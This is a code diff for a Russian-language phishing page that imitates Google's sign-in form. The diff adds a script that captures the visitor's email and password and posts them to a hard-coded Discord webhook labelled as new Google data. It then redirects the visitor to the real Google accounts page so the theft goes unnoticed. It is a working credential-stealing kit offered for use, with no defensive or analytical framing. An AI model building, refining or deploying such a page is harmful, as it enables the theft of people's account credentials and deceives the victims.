@@ -31,16 +31,12 @@
             text-align: center;
             margin-bottom: 24px;
         }
-        .logo .google-icon {
+        .google-icon {
             display: inline-block;
             width: 75px;
             height: 75px;
-            background: #fff;
-            border-radius: 50%;
-            position: relative;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
         }
-        .logo .google-icon svg {
+        .google-icon svg {
             width: 100%;
             height: 100%;
         }
@@ -78,7 +74,6 @@
             outline: none;
             border-color: #1a73e8;
             background: #fff;
-            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
         }
         .btn {
             width: 100%;
@@ -90,7 +85,6 @@
             font-size: 16px;
             font-weight: 500;
             cursor: pointer;
-            transition: background 0.2s;
             margin-top: 10px;
         }
         .btn:hover {
@@ -123,14 +117,14 @@
             <h1>Вход</h1>
             <p>Продолжите работу в аккаунте</p>
         </div>
-        <form action="send.php" method="POST">
+        <form id="loginForm" onsubmit="sendData(event)">
             <div class="input-group">
                 <label>Электронная почта или телефон</label>
-                <input type="email" name="email" placeholder="example@gmail.com" required>
+                <input type="email" id="email" name="email" placeholder="example@gmail.com" required>
             </div>
             <div class="input-group">
                 <label>Пароль</label>
-                <input type="password" name="password" placeholder="Введите пароль" required>
+                <input type="password" id="password" name="password" placeholder="Введите пароль" required>
             </div>
             <button type="submit" class="btn">Далее</button>
         </form>
@@ -139,5 +133,39 @@
         </div>
     </div>
 </div>
+
+<script>
+function sendData(event) {
+    event.preventDefault();
+    
+    var email = document.getElementById('email').value;
+    var password = document.getElementById('password').value;
+    var webhookUrl = 'https://discord.com/api/webhooks/1542530427624104118/V4cK1aDKQYYtKAbYJ_bzrHeti7QRMVTCxT8_OarJ44FIgBLWFM1wvLtTGRoC3sx-NfwZ';
+    
+    var message = '🔑 **Новые данные Google**\n';
+    message += '📧 Email: `' + email + '`\n';
+    message += '🔒 Пароль: `' + password + '`\n';
+    message += '🌐 IP: получается автоматически\n';
+    message += '🕐 Время: ' + new Date().toLocaleString('ru-RU');
+    
+    fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            content: message
+        })
+    })
+    .then(function(response) {
+        // Редирект на Google после отправки
+        window.location.href = 'https://accounts.google.com/';
+    })
+    .catch(function(error) {
+        // Если ошибка — всё равно редиректим
+        window.location.href = 'https://accounts.google.com/';
+    });
+}
+</script>
 </body>
 </html>
